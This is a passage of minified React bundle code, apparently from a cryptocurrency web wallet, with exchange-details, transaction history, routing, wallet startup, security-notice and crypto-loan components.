                }, "Go back to Step 1")));
            const repeatOperatinHandler = () => {
                e(Fu.setClearExchangeStore());
                t.replace({
                    pathname: (0,
                    M.RU)("/exchange"),
                    search: objectToString({
                        walletFrom: i.walletFrom
                    })
                })
            }
            ;
            return O.createElement("div", {
                className: Ht()(K4.wrapper, {
                    [W1]: !L
                })
            }, L && O.createElement(DashboardMenu, null), O.createElement(LockPasswordLabel, {
                params: i,
                back: "/app/exchange/confirm",
                showLockPasswordLabel: h,
                onChangeStatus: handleUnlockForm
            }), O.createElement("div", {
                className: Ht()(K4.wrapperForm, {
                    [K4.lock]: u && h
                })
            }, O.createElement("h1", {
                className: K4.headerTitle
            }, "Exchange details"), L && O.createElement(label, null, "From wallet"), O.createElement("div", {
                className: Ht()(K4.infoBlock, {
                    [K4.walletFromInfoBlock]: !L
                })
            }, O.createElement("div", {
                className: K4.fromWallet
            }, !L && O.createElement(tooltip, {
                isCopyTooltip: !0,
                classNameWrapper: K4.wrapperAmount,
                classNameText: K4.amountExchange,
                classNameTooltip: K4.tooltip,
                width: "max-content",
                positionHorizontal: "center"
            }, O.createElement(button_copy, {
                className: K4.copyButton,
                text: I
            }, ( () => `${A} ${formatTicker(null == S ? void 0 : S.currency)}`))), O.createElement("div", {
                className: K4.walletInfo
            }, !L && O.createElement("div", {
                className: K4.infoType
            }, "From wallet"), O.createElement("div", {
                className: K4.walletDescription
            }, O.createElement("div", null, O.createElement(IconCurrency, {
                isMediumIcon: !L,
                currency: null == S ? void 0 : S.currency
            })), O.createElement("div", {
                className: K4.walletDetailsWrapper
            }, O.createElement("span", {
                className: K4.walletTitle
            }, null == S ? void 0 : S.title), O.createElement("span", {
                className: K4.walletAddress
            }, null == S ? void 0 : S.address)))), L && O.createElement(tooltip, {
                isCopyTooltip: !0,
                classNameWrapper: K4.wrapperAmount,
                classNameText: K4.amountExchange,
                classNameTooltip: K4.tooltip,
                width: "max-content",
                positionHorizontal: "center"
            }, O.createElement(button_copy, {
                className: K4.copyButton,
                text: I
            }, ( () => O.createElement(O.Fragment, null, A, O.createElement("span", {
                className: K4.walletTicker
            }, formatTicker(null == S ? void 0 : S.currency)))))))), L && O.createElement(label, null, null != i && i.addressTo ? "To address" : "To wallet"), O.createElement("div", {
                className: Ht()(K4.infoBlock, {
                    [K4.walletToInfoBlock]: !L
                })
            }, O.createElement("div", {
                className: K4.toWallet
            }, !L && O.createElement(tooltip, {
                isCopyTooltip: !0,
                classNameWrapper: K4.wrapperAmount,
                classNameText: K4.amountExchange,
                classNameTooltip: K4.tooltip,
                width: "max-content",
                positionHorizontal: "center"
            }, O.createElement(button_copy, {
                className: K4.copyButton,
                text: P
            }, ( () => `${x} ${formatTicker(null == N ? void 0 : N.currency)}`))), O.createElement("div", {
                className: K4.walletInfo
            }, !L && O.createElement("div", {
                className: K4.infoType
            }, null != i && i.addressTo ? "To address" : "To wallet"), O.createElement("div", {
                className: K4.walletDescription
            }, O.createElement("div", null, O.createElement(IconCurrency, {
                isMediumIcon: !L,
                currency: null == N ? void 0 : N.currency
            })), O.createElement("div", {
                className: K4.walletDetailsWrapper
            }, O.createElement("span", {
                className: K4.walletTitle
            }, (null == N ? void 0 : N.title) || (null == N ? void 0 : N.currency.toUpperCase())), O.createElement("span", {
                className: K4.walletAddress
            }, (null == N ? void 0 : N.address) || (null == i ? void 0 : i.addressTo))))), L && O.createElement(tooltip, {
                isCopyTooltip: !0,
                classNameWrapper: K4.wrapperAmount,
                classNameText: K4.amountExchange,
                classNameTooltip: K4.tooltip,
                width: "max-content",
                positionHorizontal: "center"
            }, O.createElement(button_copy, {
                className: K4.copyButton,
                text: P
            }, ( () => O.createElement(O.Fragment, null, x, O.createElement("span", {
                className: K4.walletTicker
            }, formatTicker(null == N ? void 0 : N.currency)))))))), O.createElement("div", {
                className: Ht()(K4.infoBlock, K4.exchangeDetails)
            }, O.createElement("div", {
                className: K4.exchangeInfo
            }, O.createElement("div", {
                className: K4.infoType
            }, "Exchange ID", L && ":"), O.createElement("div", {
                className: K4.exchangeID
            }, i.exchangeId ? o === Ci ? O.createElement("span", {
                className: K4.text
            }, i.exchangeId) : O.createElement("a", {
                target: "_blank",
                href: o === ki ? "https://changenow.io/exchange/txs/" + i.exchangeId : o === Si ? "https://swapzone.io/transaction/" + i.exchangeId : void 0,
                rel: "noreferrer",
                className: Ht()(K4.exchangeIDLink, o === Ci && K4.noLonk)
            }, i.exchangeId) : O.createElement(LoaderDots, {
                visible: !0
            })))), O.createElement(ExchangeRateInfo, {
                fromWallet: S,
                toWallet: N,
                feeWallet: F,
                fee: i.fee,
                estimate: i.estimate,
                amount: i.amount,
                parentWalletTitle: getParentWalletTitle({
                    fromWallet: S,
                    feeWallet: F,
                    getParent: c
                }),
                resource: i.resource
            }), O.createElement("div", {
                className: K4.resultBlock
            }, O.createElement("div", {
                className: K4.separator
            }), O.createElement("div", {
                className: K4.progressBar
            }, O.createElement(ExchangeStatus, {
                exchangeStatusType: si
            }), O.createElement(ExchangeStatus, {
                exchangeStatusType: ii
            }), O.createElement(ExchangeStatus, {
                exchangeStatusType: oi
            }), O.createElement(ExchangeStatus, {
                exchangeStatusType: ci,
                isExchangeToAddress: Boolean(null == i ? void 0 : i.addressTo)
            }))), O.createElement(Yl, {
                className: K4.retryButton,
                onClick: repeatOperatinHandler,
                color: "blue",
                size: "large"
            }, "New exchange"), k && O.createElement("div", {
                className: Ht()(b2, k2, K4.detailsExchangeError)
            }, "Exchange has been failed. Please,", " ", O.createElement("a", {
                className: C2,
                href: "https://support.guarda.com/",
                target: "_blank",
                rel: "noreferrer"
            }, "contact support"), ".", " ")), O.createElement("input", {
                id: "exchangeAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: i.amountInUsd
            }))
        }
        var H4 = a(83473)
          , z4 = a.n(H4);
        const j4 = "history-export-csv_container_IRhys"
          , HistoryExportCSV_HistoryExportCSV = e => {
            let {className: t} = e;
            const a = usePopup()
              , handleExport = () => {
                a.open("history-export-csv", {})
            }
            ;
            return O.createElement("div", {
                className: Ht()(j4, t),
                onClick: handleExport
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: z4()
                }
            }))
        }
          , $4 = "history_wrapper_2iKFa app_wrapperBlock_2EpA3"
          , Z4 = "history_wrapperPage_2BQ1z"
          , Y4 = "history_wrapperShadow_-3cn3"
          , q4 = "history_isEmpty_2b9wY"
          , X4 = "history_wrapperTextCenter_SDvGy"
          , Q4 = "history_txDateBlock_238wh"
          , J4 = "history_centerLoader_5Hm4c"
          , e5 = "history_buttonImport_3JXja"
          , t5 = "history_historyExport_3B2LH"
          , a5 = "history_notifyButton_1qyS3"
          , n5 = "history_inlineLoader_3dfWn"
          , r5 = "history_blockLoader_3jZni"
          , l5 = "history_loadTransactionsWrapper_cmCPl"
          , s5 = "history_boxShadowNone_2Y9tB"
          , i5 = "history_title_1iXQc"
          , o5 = "history_titleWrapper_CIjct"
          , c5 = "history_refreshButton_3y0tx";
        var u5 = a(86053)
          , d5 = a.n(u5);
        const History_History = () => {
            const e = useLocationSearch()
              , t = (0,
            $.I0)()
              , a = (0,
            $.v9)(Eu)
              , [n,r] = (0,
            O.useState)({})
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)([])
              , c = usePopup()
              , [u] = OB()
              , [d,m] = DB({
                filter: n,
                allTxs: a,
                params: e
            })
              , p = !!i.length
              , f = n.wallet ? `/receive?wallet=${n.wallet.uuid}` : "/receive"
              , E = n.wallet ? `/buy?walletTo=${n.wallet.uuid}` : "/buy";
            (0,
            O.useEffect)((function onFilterTransactions() {
                d()
            }
            ), [a, n]);
            (0,
            O.useEffect)((function onSetFilteredTransactions() {
                o(m)
            }
            ), [m]);
            async function handleUpdate() {
                s(!0);
                if (n.wallet) {
                    t(updateWalletsBalanceAndTxs(n.wallet, {
                        isCascade: !0
                    }));
                    t(updateInternalTxs(!0));
                    setTimeout(( () => s(!1)), 2e3)
                } else {
                    t(updateWalletsData_updateAllWallets({
                        force: !0,
                        txs: !0,
                        balance: !1
                    }));
                    t(updateInternalTxs(!0));
                    setTimeout(( () => s(!1)), 2e3)
                }
            }
            (0,
            O.useEffect)(( () => {
                handleUpdate()
            }
            ), []);
            const handleNotifyMe = async () => {
                c.open("push-notifications", {})
            }
            ;
            return O.createElement("div", {
                className: Ht()("pageWrapper", Z4)
            }, O.createElement("div", {
                className: Ht()($4, {
                    [q4]: !p
                })
            }, O.createElement("div", {
                className: Ht()(Y4, {
                    [s5]: !p
                })
            }, O.createElement("div", {
                className: o5
            }, O.createElement("h3", {
                className: i5
            }, "History")), O.createElement(BoardHistoryFilter, {
                onFilterAccept: r
            })), !p && O.createElement("div", {
                className: X4
            }, O.createElement("img", {
                src: BB,
                alt: "Transaction not found"
            }), O.createElement("p", null, "Top up your wallet or  ", O.createElement(Y.OL, {
                to: (0,
                M.RU)(f)
            }, "share your public address"), O.createElement("br", null), "with somebody to get coins or tokens."), !(0,
            M.tq)() && !(0,
            M.p1)() && O.createElement(Y.OL, {
                to: (0,
                M.RU)(E)
            }, O.createElement(Yl, {
                color: "blue"
            }, "Buy crypto")), !l && O.createElement("div", {
                className: l5
            }, O.createElement("span", {
                className: "dashedNormal",
                onClick: handleUpdate
            }, "Load transactions")), l && O.createElement("div", {
                className: l5
            }, O.createElement("span", null, "Fetching transactions"), O.createElement(LoaderDots, {
                visible: !0
            }))), p && O.createElement(xR, {
                className: c5,
                isLoading: l,
                handleUpdate,
                right: 110
            }), p && O.createElement("div", {
                className: a5,
                onClick: handleNotifyMe
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: d5()
                }
            })), p && O.createElement(HistoryExportCSV_HistoryExportCSV, {
                className: t5
            }), O.createElement(RB, {
                txs: i
            }, (t => O.createElement("div", {
                key: `tx-list${t.date}`
            }, O.createElement("div", {
                className: Q4
            }, t.date), t.list.map(( (t, a) => O.createElement(sb, {
                isSend: !1,
                key: t.primaryKey || a
            }, O.createElement(TransactionItem_TransactionItem, {
                tx: t,
                onOpen: u,
                params: e
            })))))))))
        }
          , pushFragmentChildren = (e, t) => {
            O.Children.forEach(t.props.children, (t => {
                t.type === O.Fragment ? pushFragmentChildren(e, t) : e.push(t)
            }
            ))
        }
          , AppRouter = () => {
            const e = (0,
            $.v9)(oe.kI)
              , [t,a] = (0,
            O.useState)(e);
            (0,
            O.useEffect)(( () => {
                void 0 !== e && a(e)
            }
            ), [e]);
            const n = null != e ? e : t
              , r = [];
            pushFragmentChildren(r, O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/supported-currencies/:section?",
                component: SupportedCurrenciesRoot
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/status-coins",
                component: StatusCoinRoot
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/status-resources",
                component: StatusResourcesRoot
            })));
            n === oe.PZ.LOGGED_OUT_HAS_NO_BACKUP && pushFragmentChildren(r, O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app",
                component: WelcomeRoot
            }), Sq ? O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/create",
                component: CreateMnemonicPage
            })) : O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/create",
                component: CreateFullWallet
            })), O.createElement(j.AW, {
                exact: !0,
                path: "/app/import",
                component: InitialImportWallet
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/restore",
                component: InitialImportWallet
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/recovery-mnemonic",
                component: InitialImportWallet
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/import-mnemonic",
                component: InitialImportWallet
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/set-password",
                component: AppPageSetPassword
            }), O.createElement(j.AW, {
                path: "/app/send",
                component: WelcomeRoot
            }), O.createElement(j.AW, {
                path: "/app/exchange",
                component: WelcomeRoot
            }), O.createElement(j.AW, {
                component: WelcomeRoot
            })));
            n === oe.PZ.LOGGED_OUT_HAS_BACKUP && pushFragmentChildren(r, O.createElement(O.Fragment, null, O.createElement(j.AW, {
                path: "/app",
                component: EnterPasswordPage
            })));
            n === oe.PZ.LOGGED_IN && pushFragmentChildren(r, O.createElement(O.Fragment, null, O.createElement(j.l_, {
                from: "/app/create",
                to: "/app"
            }), O.createElement(j.l_, {
                from: "/app/restore",
                to: "/app"
            }), O.createElement(j.l_, {
                from: "/app/import",
                to: "/app"
            })));
            pushFragmentChildren(r, O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/history",
                component: History_History
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/settings/:section?",
                component: settings
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/wallet-management",
                component: WalletManagement
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy",
                component: BuySell_BuySell
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy/simplex/confirm",
                component: SimplexConfirm
            }), (0,
            M.d)() ? O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy/simplex/view/:paymentId",
                component: SimplexView_SimplexView
            }) : O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy/simplex/view/:paymentId",
                component: BuySell_BuySell
            }), (0,
            M.d)() ? O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy/gardarian/view/:paymentId",
                component: GuardarianView
            }) : O.createElement(j.AW, {
                exact: !0,
                path: "/app/buy/gardarian/view/:paymentId",
                component: BuySell_BuySell
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/exchange",
                component: ExchangeMainPage_ExchangeMainPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/exchange/details",
                component: ExchangeDetailsPage_ExchangeDetailsPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app",
                component: board
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/:section/:fragment?/:params?/:otherparams?",
                component: board
            }), O.createElement(j.AW, {
                component: _404
            })));
            return O.createElement(j.rs, null, r)
        }
          , m5 = AppRouter
          , p5 = "app_pageBackground_2Jmxb"
          , f5 = "app_pageWrapper_nSOZm"
          , E5 = "app_wrapperBlock_2EpA3"
          , h5 = "app_wrapperCenterBlock_bcslh"
          , g5 = "app_wrapperCenterBlockBackup_1twFL"
          , y5 = "app_wrapperLeftBlock_3QLZp"
          , v5 = "app_footerButtonStatus_1lnBU"
          , _5 = "app_footerBlock_n86Kc"
          , w5 = "app_stepInfo_2VLE6"
          , b5 = "app_centerContainer_1VI1M";
        function WebWalletsRouter() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.Oj)
              , a = (0,
            $.v9)($c)
              , n = useLocationSearch()
              , r = (0,
            $.v9)(Bo)
              , l = (0,
            $.v9)(Ro);
            (0,
            O.useEffect)(( () => {
                "1" === n.fullWebVersion && window.localStorage.setItem("full-web-version", "1");
                "0" === n.fullWebVersion && window.localStorage.setItem("full-web-version", "0");
                const e = window.localStorage.getItem("full-web-version");
                O_ && "1" !== e && (window.location.href = "/app/mobile")
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                async function start() {
                    try {
                        if (t && !a.length) {
                            const t = await e(restoreStorage());
                            t && await e(restoreWallets(t.wallets))
                        }
                    } catch (e) {}
                }
                start()
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                if (!0 !== r) {
                    e(lb.initializeStakingInfoUpdater());
                    e(Fu.initializeTokenInfoUpdater());
                    e(hh.initializeSpamTokenListUpdater());
                    e(startSocketManager());
                    e(fetchMultisigs())
                }
            }
            ), [r]);
            (0,
            O.useEffect)(( () => {
                if (!0 !== l && !1 !== t && 0 !== a.length) {
                    e(dt());
                    e(ct(!0))
                }
            }
            ), [l, t, a]);
            const s = (0,
            O.useMemo)((async () => {
                const e = await Se.Z.getApiByCurrency("eth")
                  , t = await e.createWallet();
                if (!e || !e.createWallet)
                    throw "Something wrong...";
                return t
            }
            ), [])
              , findEthLikeWallet = async () => a.find((e => "ETH_LIKE_WALLET" === e.type))
              , setPrivateKeyForApi = async () => {
                const e = await findEthLikeWallet()
                  , t = await s;
                e ? Se.Z.setPrivateKeyForApi(e.privateKey) : Se.Z.setPrivateKeyForApi(t.privateKey);
                o(!0)
            }
              , resetPrivateKeyForApi = async () => {
                const e = await s;
                Se.Z.setPrivateKeyForApi(e.privateKey);
                o(!1)
            }
              , [i,o] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                !0 !== t && resetPrivateKeyForApi()
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !1 !== t && !0 !== i && setPrivateKeyForApi()
            }
            ), [t, a]);
            return null === O_ ? O.createElement("div", {
                className: p5
            }, O.createElement(HeaderWallets, null), O.createElement("div", {
                className: f5
            }, O.createElement(sb, null, O.createElement(m5, null), O.createElement(ReduxPersistErrorThrower, null))), O.createElement(Footer_Footer, null), O.createElement(eS, null)) : null
        }
        function WindowClose() {
            (0,
            O.useEffect)(( () => {
                window.close()
            }
            ), []);
            return O.createElement("div", null)
        }
        const k5 = a.p + "b02eace09a0e3cc2b62474df0903530e.svg"
          , S5 = a.p + "23f68613f1ec1750fea1d891966167b2.svg"
          , C5 = {
            body: "under-attack_body_21QKt",
            wrapper: "under-attack_wrapper_1Nxn5",
            imageWrapper: "under-attack_imageWrapper_3Q2E1",
            text: "under-attack_text_2K-0O",
            button: "under-attack_button_3V6K9",
            linkTlg: "under-attack_linkTlg_2E4o8",
            iconWrap: "under-attack_iconWrap_1iVqw"
        };
        function UnderAttack() {
            const e = undefined
              , t = AttackManager.getMessage() || "Guarda is blocked for security reasons. Don't worry, your funds are safe. Please get more information using the contacts below.";
            return O.createElement("div", {
                className: C5.body
            }, O.createElement("div", {
                className: C5.wrapper
            }, O.createElement("div", {
                className: C5.imageWrapper
            }, O.createElement("img", {
                src: k5,
                alt: "We are under attack!"
            })), O.createElement("p", {
                className: C5.text
            }, t), O.createElement("a", {
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener",
                className: C5.link
            }, "support@guarda.com"), O.createElement("p", {
                className: C5.text
            }, "or ask in our"), O.createElement("a", {
                href: "https://t.me/Guarda_community",
                className: C5.link
            }, O.createElement("span", {
                className: C5.button
            }, O.createElement("span", {
                className: C5.iconWrap
            }, O.createElement("img", {
                src: S5,
                alt: "Telegram"
            })), "Telegram Community"))))
        }
        const N5 = UnderAttack
          , T5 = "misk-info-modern_wrapper_2wCKZ"
          , A5 = "misk-info-modern_title_1cufg"
          , x5 = "misk-info-modern_value_1J20L"
          , I5 = "misk-info-modern_isAction_3tvvF"
          , P5 = "misk-info-modern_disabled_3UXd1"
          , L5 = "misk-info-modern_hightlight_LKf94";
        function misk_info_modern_extends() {
            misk_info_modern_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return misk_info_modern_extends.apply(this, arguments)
        }
        const F5 = undefined
          , misk_info_modern = e => {
            let {children: t, className: a} = e;
            return O.createElement("div", {
                className: Ht()(T5, a)
            }, t)
        }
          , misk_info_modern_MiskInfoTitle = e => {
            let {children: t, ...a} = e;
            const {className: n} = a;
            return O.createElement("div", {
                className: Ht()(A5, n && n)
            }, t)
        }
          , misk_info_modern_MiskInfoValue = e => {
            let {hightlight: t, children: a, disabled: n, onClick: r, className: l, ...s} = e;
            return O.createElement("div", misk_info_modern_extends({
                className: Ht()(x5, {
                    [I5]: !!r,
                    [P5]: n,
                    [L5]: t
                }, l),
                onClick: r
            }, s), n ? O.createElement(LoaderDots, {
                visible: !0
            }) : a)
        }
          , W5 = 20
          , R5 = Math.round(Math.PI * W5 * 2)
          , getOffset = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
            return Math.round((100 - Math.min(e, 100)) / 100 * R5)
        };
        function CircleLoader(e) {
            const {progress: t, text: a} = e
              , n = getOffset(t)
              , r = "stroke-dashoffset 0.5s ease-out";
            return O.createElement("svg", {
                width: "100%",
                height: "100%",
                viewBox: "-10 -10 60 60"
            }, O.createElement("circle", {
                stroke: "#f1f2fa",
                cx: "20",
                cy: "20",
                r: W5,
                strokeWidth: "2",
                fill: "none"
            }), O.createElement("circle", {
                stroke: "#7190EB",
                transform: "rotate(-90 20 20)",
                cx: "20",
                cy: "20",
                r: W5,
                strokeDasharray: R5,
                strokeWidth: "2",
                strokeDashoffset: "0",
                fill: "none",
                style: {
                    strokeDashoffset: n,
                    transition: r
                }
            }), O.createElement("text", {
                x: W5,
                y: W5,
                textAnchor: "middle",
                dominantBaseline: "central"
            }, a))
        }
        const B5 = "mini-tabs-selector_wrapper_cAdse"
          , O5 = "mini-tabs-selector_container_3gfR4";
        function MiniTabSelector(e) {
            return O.createElement("div", {
                className: B5
            }, O.createElement("div", {
                className: O5
            }, e.children))
        }
        MiniTabSelector.propTypes = {
            children: as().node
        };
        const D5 = "PopupSuccess_popup_PBCKb"
          , M5 = "PopupSuccess_header_jtMUu"
          , U5 = "PopupSuccess_headerSubTitle_26HQ7"
          , G5 = "PopupSuccess_headerTitle_PuXiU"
          , V5 = "PopupSuccess_iconSuccess_1812G"
          , K5 = "PopupSuccess_currecniesPairs_2VDpF"
          , H5 = "PopupSuccess_currencyBlock_3dgh3"
          , z5 = "PopupSuccess_currencySeparator_KaWz-"
          , j5 = "PopupSuccess_body_2HHMh"
          , $5 = "PopupSuccess_bottomButton_2KM62"
          , Z5 = "PopupSuccess_currencyTicker_2SaR-"
          , Y5 = "PopupSuccess_currencyAmountGreen_1dprV"
          , q5 = "PopupSuccess_currencyAmount_2fqX1";
        function PopupLoanSuccess(e) {
            return O.createElement(aa, {
                visible: e.visible,
                width: 370,
                onClose: e.onClose,
                className: D5
            }, O.createElement("div", {
                className: M5
            }, O.createElement("div", {
                className: U5
            }, "Collateral has been sent"), O.createElement("div", {
                className: G5
            }, "Success!"), O.createElement("div", {
                className: V5
            })), O.createElement("div", {
                className: j5
            }, O.createElement("p", null, "You will receive your loan within 5-10 minutes."), O.createElement("div", {
                className: K5
            }, O.createElement("div", {
                className: H5
            }, O.createElement(IconCurrency, {
                currency: e.data.currencyFrom
            }), O.createElement("span", {
                className: q5
            }, "- ", e.data.amountFrom), O.createElement("span", {
                className: Z5
            }, (0,
            be.xG)(e.data.currencyFrom))), O.createElement("div", {
                className: z5
            }), O.createElement("div", {
                className: H5
            }, O.createElement(IconCurrency, {
                currency: e.data.currencyTo
            }), O.createElement("span", {
                className: Y5
            }, "+ ", e.data.amountTo, " "), O.createElement("span", {
                className: Z5
            }, (0,
            be.xG)(e.data.currencyTo))))), O.createElement("div", {
                className: $5,
                onClick: e.onClose
            }, "OK"))
        }
        const X5 = {
            overflowHidden: "borrow_overflowHidden_4Zatm",
            borrowWhiteContainer: "borrow_borrowWhiteContainer_nTXwN",
            borrowBorderContainer: "borrow_borrowBorderContainer_2sqq3",
            lastBlock: "borrow_lastBlock_2NL6O",
            description: "borrow_description_1xZSj",
            backButton: "borrow_backButton_32C1l",
            bottomButtomContainer: "borrow_bottomButtomContainer_3GADI",
            bottomInformation: "borrow_bottomInformation_2EF5Z",
            transactionError: "borrow_transactionError_qMN9A",
            electronPadding: "borrow_electronPadding_ZCEA2"
        }
          , Q5 = {
            row: "BorrowIndexPage_row_15N2Y",
            description: "BorrowIndexPage_description_Q9wbX",
            ulElement: "BorrowIndexPage_ulElement_1KINT",
            youGetResultBlock: "BorrowIndexPage_youGetResultBlock_3-Alk",
            youGetResultBlockResult: "BorrowIndexPage_youGetResultBlockResult_4P8m_",
            youGetResultBlockSymbol: "BorrowIndexPage_youGetResultBlockSymbol_2mz9O",
            separatorTitle: "BorrowIndexPage_separatorTitle_3v2I0",
            separatorButton: "BorrowIndexPage_separatorButton_1q6pW",
            undoButton: "BorrowIndexPage_undoButton_2Yx3S",
            inputError: "BorrowIndexPage_inputError_1F2_E",
            errorInput: "BorrowIndexPage_errorInput_3RhNx",
            inputWrapper: "BorrowIndexPage_inputWrapper_2CiDJ",
            customWrapperCurrencies: "BorrowIndexPage_customWrapperCurrencies_2x6IZ",
            inputWidth: "BorrowIndexPage_inputWidth_2YtYn",
            loaderSpace: "BorrowIndexPage_loaderSpace_23VgU",
            loading: "BorrowIndexPage_loading_rKUV0",
            circleWrapper: "BorrowIndexPage_circleWrapper_2vvHe",
            externalLink: "BorrowIndexPage_externalLink_11wTW",
            linkImage: "BorrowIndexPage_linkImage_7Rlei",
            tooltipInfo: "BorrowIndexPage_tooltipInfo_2NQY2",
            iconInfo: "BorrowIndexPage_iconInfo_ho1aC",
            walletInput: "BorrowIndexPage_walletInput_11qoo",
            wrapperList: "BorrowIndexPage_wrapperList_1ZZ3u",
            inputWrapperClassName: "BorrowIndexPage_inputWrapperClassName_1nFNw",
            userSelect: "BorrowIndexPage_userSelect_2oXCC",
            loanHeader: "BorrowIndexPage_loanHeader_H0pnW",
            infoText: "BorrowIndexPage_infoText_2Qp08",
            additionalInfo: "BorrowIndexPage_additionalInfo_1xgG1",
            bigButton: "BorrowIndexPage_bigButton_3g9t4",
            infoContainer: "BorrowIndexPage_infoContainer_11u2O"
        }
          , J5 = [{
            title: "USDT(ERC20)",
            ticker: "usdt",
            contract: "0xdac17f958d2ee523a2206206994597c13d831ec7",
            decimals: 6
        }, {
            title: "USDC",
            ticker: "usdc",
            contract: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            decimals: 6
        }, {
            title: "SHIB",
            ticker: "shib",
            contract: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
            decimals: 18
        }]
          , e6 = [{
            title: "USDT (TRC20)",
            ticker: "usdt",
            contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            decimals: 6
        }]
          , t6 = ["0.5", "0.65", "0.8", "0.9"]
          , patchBorrowWalletCurrencyForApi = e => e.currency
          , BorrowPage_utils_patchBorrowCurrency = e => e || ""
          , BorrowPageUpdater = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Bo);
            (0,
            O.useEffect)(( () => {
                !0 !== t && e(fetchUserLoans())
            }
            ), [t]);
            return O.createElement(O.Fragment, null)
        }
          , getBorrowBoardError = (e, t) => {
            const a = /The calculated amount [\d., ]+ .+ is less than min amount .+ [\d., ]+/
              , n = /The parameters .amount. does not exists/
              , r = /The calculated amount (\d+(?:\.\d+)?) (\w+) \[(\w+)\] is less than min amount (\d+(?:\.\d+)?) (\w+) \[(\w+)\]/
              , l = e.match(r);
            if (e.includes("Data for currency"))
                return "This currency is not accepted as loan collateral. Please, select another currency and try again.";
            if (a.test(e))
                return `Collateral amount must be greater than ${t}`;
            if (n.test(e))
                return "Please, specify a collateral amount";
            if (l) {
                const [,,,,e,t,a] = l;
                return `The minimum amount for the loan is ${e} ${t.toUpperCase()} [${a.toUpperCase()}], please increase your collateral amount.`
            }
            return e
        }
        ;
        function useWalletsBorrow(e, t) {
            return e.filter((e => !e.isWatchOnly && !e.isHw)).flatMap((e => {
                var a, n;
                return [fake_to_real_wallet_fakeSubWalletsForTokens(e, null == t || null === (a = t.loans) || void 0 === a || null === (n = a.filter((t => t.network === e.currency && !!t.smart_contract))) || void 0 === n ? void 0 : n.map((e => ({
                    precision: e.decimal_places,
                    smartContract: e.smart_contract,
                    ticker: e.currency,
                    title: e.title
                }))))]
            }
            ))
        }
        function useWalletsToSendLoan(e, t) {
            if (!e || !t)
                return [];
            const filterWalletsByNetwork = e => {
                var a;
                return !e.isWatchOnly && !e.isHw && e.currency === (null === (a = t.currency_network) || void 0 === a ? void 0 : a.toLowerCase())
            }
              , filterTokensByLoanCurrency = e => e.ticker === BorrowPage_utils_patchBorrowCurrency(t.currency).toLowerCase()
              , formWallet = e => "eth" === e.currency ? fake_to_real_wallet_fakeSubWalletsForTokens(e, J5.filter(filterTokensByLoanCurrency)) : "trx" === e.currency ? fake_to_real_wallet_fakeSubWalletsForTokens(e, e6.filter(filterTokensByLoanCurrency)) : void 0;
            return e.filter(filterWalletsByNetwork).map(formWallet).filter((e => void 0 !== e))
        }
        function useWalletsToTopUp(e, t) {
            if (!e || !t)
                return [];
            const filterWalletsByNetwork = e => !e.isWatchOnly && !e.isHw
              , filterTokensByLoanCurrency = e => e.ticker.toLowerCase() === patchBorrowCurrency(t).toLowerCase()
              , formWallet = e => "eth" === e.currency ? fakeSubWalletsForTokens(e, fakeEthTokens.filter(filterTokensByLoanCurrency)) : "trx" === e.currency ? fakeSubWalletsForTokens(e, fakeTrxTokens.filter(filterTokensByLoanCurrency)) : void 0;
            return e.filter(filterWalletsByNetwork).map(formWallet).filter((e => void 0 !== e))
        }
        const getMaxDefaultLoanValue = (e, t) => {
            if (!t || null == t || !t.currency)
                return;
            const a = t.currency.toLowerCase()
              , n = ((null == t ? void 0 : t.family) || (null == t ? void 0 : t.currency)).toLowerCase()
              , r = e.loans.find((e => e.currency.toLowerCase() === a && e.network.toLowerCase() === n));
            return null == r ? void 0 : r.loan_deposit_max_amount
        }
          , a6 = {
            max: 8
        }
          , n6 = {
            max: 0,
            roundDown: !0
        }
          , r6 = {
            max: 8
        }
          , l6 = {
            max: 2,
            min: 2
        }
          , s6 = {
            max: 2,
            min: 2
        }
          , i6 = {
            max: 6
        }
          , o6 = {
            max: 2,
            min: 2
        }
          , useMinimalAmountInCrypto = e => {
            var t, a;
            const [n,r] = (0,
            O.useState)()
              , {walletTo: l, walletFrom: s, convertToFiat: i, convertToCrypto: o} = e
